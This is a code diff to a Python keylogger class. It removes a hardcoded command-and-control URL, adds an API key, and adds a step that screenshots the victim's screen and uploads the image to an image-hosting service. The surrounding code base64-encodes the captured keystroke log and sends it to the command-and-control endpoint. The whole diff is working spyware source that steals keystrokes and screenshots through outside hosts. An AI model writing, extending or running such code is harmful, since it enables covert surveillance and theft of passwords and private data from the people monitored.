@@ -3,8 +3,11 @@ from threading import Timer
 from base64 import b64encode
 import requests
 from datetime import datetime
+import io
+import pyautogui
 
-C2_URL = "https://eojq8hwqcmc0vnh.m.pipedream.net"
+C2_URL = ""
+API_KEY = ""
 
 class Keylogger:
     def __init__(self, interval):
@@ -16,7 +19,20 @@ class Keylogger:
         leaked_bytes = (self.log).encode("ascii")
         leaked_info = b64encode(leaked_bytes)
         res = requests.get(C2_URL,params=(leaked_info))
-    
+        screenshot = pyautogui.screenshot()
+        img_bytes = io.BytesIO()
+        screenshot.save(img_bytes, format="PNG")
+        img_bytes = img_bytes.getvalue()
+        img_encodeed = b64encode(img_bytes)
+
+        url = "https://api.imgbb.com/1/upload"
+        payload = {
+            "key" : API_KEY,
+            "image" : img_encodeed
+        }
+
+        res = requests.post(url, payload)
+        print(res.status_code)
     
     def callback(self, event):
         # key UP is occured
